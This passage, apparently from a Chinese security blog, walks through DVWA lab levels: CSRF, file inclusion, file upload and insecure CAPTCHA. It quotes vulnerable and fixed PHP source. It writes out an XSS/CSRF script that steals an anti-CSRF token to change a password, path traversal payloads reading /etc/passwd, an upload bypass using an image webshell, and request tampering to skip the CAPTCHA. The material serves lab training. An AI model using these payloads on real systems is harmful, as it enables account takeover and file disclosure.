<p>使用 <code>checkToken</code> 函数验证 token，这样 CSRF 攻击的时候必须知道用户的 token 才可以成功，可以通过使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中，就可以完成修改密码的操作</p>
<p>可以去构造一个攻击脚本，脚本的作用就是获取用户token然后修改密码，将其放置在存储型XSS中，只要用户点击存储型XSS页面，就会完成CSRF攻击，即修改密码，下面是代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function attack()&#123;</span><br><span class="line">        document.getElementsByName(&#x27;user_token&#x27;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#x27;user_token&#x27;)[0].value;</span><br><span class="line">        document.getElementById(&quot;transfer&quot;).submit(); </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line">    &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></div></figure>

<p>利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token)</p>
<p>将这段脚本赋给txtName变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#x27;user_token&#x27;)[0].value)&gt;</span><br></pre></td></tr></table></div></figure>

<p>就可以获取到用户token</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261044928.png" alt="image-20240526104420862"></p>

        <h2 id="Impossible-2"   >
          <a href="#Impossible-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261111981.png" alt="image-20240526111144899"></p>
<p>对于 High 级别主要就是增加了输入当前密码的选项</p>

        <h1 id="四、文件包含"   >
          <a href="#四、文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、文件包含" class="headerlink" title="四、文件包含"></a>四、文件包含</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210853201.png" alt="image-20240521085315103"></p>
<p>三个文件，依次点进去</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210854330.png" alt="image-20240521085434286"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210854374.png" alt="image-20240521085451335"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210855753.png" alt="image-20240521085505715"></p>
<p>URL都会有相应改变</p>

        <h2 id="Low-3"   >
          <a href="#Low-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2>
      <p>先在文件上传漏洞处上传一个写有phpinfo()的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210913327.png" alt="image-20240521091302289"></p>
<p>再回到文件上传漏洞，将路径粘贴到参数page中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210914641.png" alt="image-20240521091440586"></p>
<p>文件成功执行</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210916324.png" alt="image-20240521091605288"></p>
<p>没有任何过滤</p>

        <h2 id="Medium-3"   >
          <a href="#Medium-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210918327.png" alt="image-20240521091815300"></p>
<p>过滤了字符串 <code>$file</code> 中的 <code>http://</code> , <code>https://</code>和路径中的 <code>../</code>（Unix/Linux 系统）和 <code>..\\</code>（Windows 系统）,如果有识别到这些字符则替换成空白字符</p>
<p>绕过方式：①双写②使用绝对路径</p>

        <h3 id="双写"   >
          <a href="#双写" class="heading-link"><i class="fas fa-link"></i></a><a href="#双写" class="headerlink" title="双写"></a>双写</h3>
      <p>在文件上传处上传phpinfo()文件（但是Medium难度下只能上传图片，所以把后缀改成jpg）</p>
<p>上传成功后构造payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=..././..././hackable/uploads/info.jpg</span><br></pre></td></tr></table></div></figure>

<p>实际识别到的还是</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../hackable/uploads/info.jpg</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210944172.png" alt="image-20240521094452130"></p>

        <h3 id="使用绝对路径"   >
          <a href="#使用绝对路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用绝对路径" class="headerlink" title="使用绝对路径"></a>使用绝对路径</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=/etc/passwd</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212139550.png" alt="image-20240521213902434"></p>

        <h2 id="High-3"   >
          <a href="#High-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-3" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211008555.png" alt="image-20240521100836525"></p>
<p><code>fnmatch(&quot;file*&quot;, $file)</code>：这个函数用于比较 <code>$file</code> 变量是否匹配模式 <code>&quot;file*&quot;</code>。这里的模式 <code>&quot;file*&quot;</code> 表示任何以 “file” 开头的字符串都应该匹配。如果 <code>$file</code> 符合这个模式，<code>fnmatch</code> 函数返回 <code>true</code>。此外，还检查 <code>$file</code> 是否不等于 <code>&quot;include.php&quot;</code>。</p>
<p>所以传入的参数中必须以file为开头</p>
<p>可以想到用file://伪协议</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file:///etc/passwd</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212139342.png" alt="image-20240521213956283"></p>

        <h2 id="Impossible-3"   >
          <a href="#Impossible-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231105935.png" alt="image-20240523110512896"></p>
<p>只允许包含include.php,file1.php,file2.php,file3.php的文件</p>

        <h1 id="五、文件上传"   >
          <a href="#五、文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、文件上传" class="headerlink" title="五、文件上传"></a>五、文件上传</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211015259.png" alt="image-20240521101511230"></p>

        <h2 id="Low-4"   >
          <a href="#Low-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2>
      <p>可以选择一个任意格式的文件上传，比如文件包含中Low难度的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211017425.png" alt="image-20240521101715390"></p>
<p>成功上传</p>
<p>复制路径访问<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/hackable/uploads/info.php" >http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/info.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>但实际访问的是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/hackable/uploads/info.php" >http://127.0.0.1:4280/hackable/uploads/info.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211021371.png" alt="image-20240521102100331"></p>
<p>表示上传成功</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211022578.png" alt="image-20240521102237537"></p>
<p>没什么限制</p>

        <h2 id="Medium-4"   >
          <a href="#Medium-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211023786.png" alt="image-20240521102321755"></p>
<p>限制了上传的文件必须是图片类型，并且小于100000</p>
<p>那就更改文件后缀为.jpg，上传并抓包，然后将文件后缀修改为.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211029661.png" alt="image-20240521102917633"></p>
<p>发送后可以看到文件成功上传</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211029463.png" alt="image-20240521102948439"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211031549.png" alt="image-20240521103119521"></p>

        <h2 id="High-4"   >
          <a href="#High-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-4" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211032344.png" alt="image-20240521103253304"></p>
<p>新增了使用<code>getimagesize()</code> 函数尝试获取图像的大小信息。如果文件是一个有效的图像，该函数会成功返回图像的尺寸信息；如果不是，返回 <code>false</code>。</p>
<p>需要制作一个图片马</p>
<p>方法：</p>
<p>将一个本来的图片文件用Notepad++打开，在后面添加一句话木马(phpinfo())</p>
<p>上传成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212153165.png" alt="image-20240521215335115"></p>
<p>用文件包含里的打开</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212152876.png" alt="image-20240521215252769"></p>

        <h2 id="Impossible-4"   >
          <a href="#Impossible-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211103883.png" alt="image-20240521110317819"></p>
<p>调用 <code>checkToken</code> 函数来验证 CSRF 令牌的有效性，防止跨站请求伪造攻击，并且末尾调用 <code>generateSessionToken()</code> 函数来生成新的 CSRF 令牌，准备下一次请求。</p>
<p>使用 <code>md5</code> 函数和 <code>uniqid</code> 函数生成基于上传文件名称的唯一文件名，以避免文件名冲突或敏感信息泄露。</p>
<p>使用<code>imagecreatefromjpeg</code> 和 <code>imagecreatefrompng</code>去除任何潜在的恶意元数据，代码对图像进行了重新编码。</p>
<p>如果存在临时文件，则使用 <code>unlink</code> 删除</p>

        <h1 id="六、不安全的验证码"   >
          <a href="#六、不安全的验证码" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、不安全的验证码" class="headerlink" title="六、不安全的验证码"></a>六、不安全的验证码</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241049477.png" alt="image-20240524104922436"></p>

        <h2 id="Low-5"   >
          <a href="#Low-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2>
      <p>查看关键源代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) &amp;&amp; ( $_POST[ &#x27;step&#x27; ] == &#x27;1&#x27; ) ) &#123;</span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party</span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ &#x27;recaptcha_private_key&#x27;],</span><br><span class="line">        $_POST[&#x27;g-recaptcha-response&#x27;]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail?</span><br><span class="line">    if( !$resp ) &#123;</span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // CAPTCHA was correct. Do both new passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // Show next stage for the user</span><br><span class="line">            echo &quot;</span><br><span class="line">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span><br><span class="line">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Both new passwords do not match.</span><br><span class="line">            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;</span><br><span class="line">            $hide_form = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) &amp;&amp; ( $_POST[ &#x27;step&#x27; ] == &#x27;2&#x27; ) ) &#123;</span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Check to see if both password match</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with the passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>步骤分为两步，第一步输入两次密码后验证CAPTCH是否通过，如果两次密码一样并且通过验证，则提示按按钮来确认，于是来到第二步，更新密码</p>
<p>修改密码时需要验证是否是真人</p>
<p>抓包看看，可以看到我现在正处于第一步，并且有g-recaptcha-response参数，用于验证用户的交互以确认他们是真实的用户而非自动化脚本或机器人</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241039323.png" alt="image-20240524103938205"></p>
<p>那么我们直接跳过这一步，将step值改为2再发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241042392.png" alt="image-20240524104256356"></p>
<p>成功修改密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241042729.png" alt="image-20240524104236685"></p>

        <h2 id="Medium-5"   >
          <a href="#Medium-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241055812.png" alt="image-20240524105545774"></p>
<p>第二步中新增了检查 POST 请求中 <code>passed_captcha</code> 参数是否为True</p>
<p>抓包修改step的值为2，并且增加一个<code>passed_captcha</code> 参数，值为true</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241106627.png" alt="image-20240524110624587"></p>
<p>发送，修改成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241108352.png" alt="image-20240524110825309"></p>

        <h2 id="High-5"   >
          <a href="#High-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-5" class="headerlink" title="High"></a>High</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241122687.png" alt="image-20240524112233649"></p>
<p>检查 POST 数据中，<code>g-recaptcha-response</code> 字段是否等于 <code>&#39;hidd3n_valu3&#39;</code>，检查User-Agent是否被设置为 <code>&#39;reCAPTCHA&#39;</code>，并且取消了第二步</p>
<p>所以抓包修改<code>g-recaptcha-response</code> 的值为 <code>hidd3n_valu3</code>，User-Agent值为reCAPTCHA</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241125526.png" alt="image-20240524112524481"></p>
<p>发送，修改成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241125100.png" alt="image-20240524112537064"></p>

        <h2 id="Impossible-5"   >
          <a href="#Impossible-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看源代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_new  = stripslashes( $pass_new );</span><br><span class="line">    $pass_new  = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line">    $pass_conf = stripslashes( $pass_conf );</span><br><span class="line">    $pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ &#x27;password_current&#x27; ];</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party</span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ &#x27;recaptcha_private_key&#x27; ],</span><br><span class="line">        $_POST[&#x27;g-recaptcha-response&#x27;]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail?</span><br><span class="line">    if( !$resp ) &#123;</span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:password&#x27;, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        // Do both new password match and was the current password correct?</span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;</span><br><span class="line">            // Update the database</span><br><span class="line">            $data = $db-&gt;prepare( &#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27; );</span><br><span class="line">            $data-&gt;bindParam( &#x27;:password&#x27;, $pass_new, PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">            // Feedback for the end user - success!</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Feedback for the end user - failed!</span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">            $hide_form = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>检查 Anti-CSRF 令牌，验证用户会话中的 CSRF 令牌是否有效，以防止 CSRF 攻击</p>
<p>用户输入的新密码和确认密码都通过 <code>stripslashes</code> 和 <code>mysqli_real_escape_string</code> 处理以防止 SQL 注入，并使用 MD5 进行加密</p>
<p>并且还会检查当前密码是否正确，并使用预处理语句查询数据库验证当前密码</p>

        <h1 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
      
        <h2 id="Low-6"   >
          <a href="#Low-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211513362.png" alt="image-20240521151351307"></p>

        <h3 id="手工注入"   >
          <a href="#手工注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3>
      
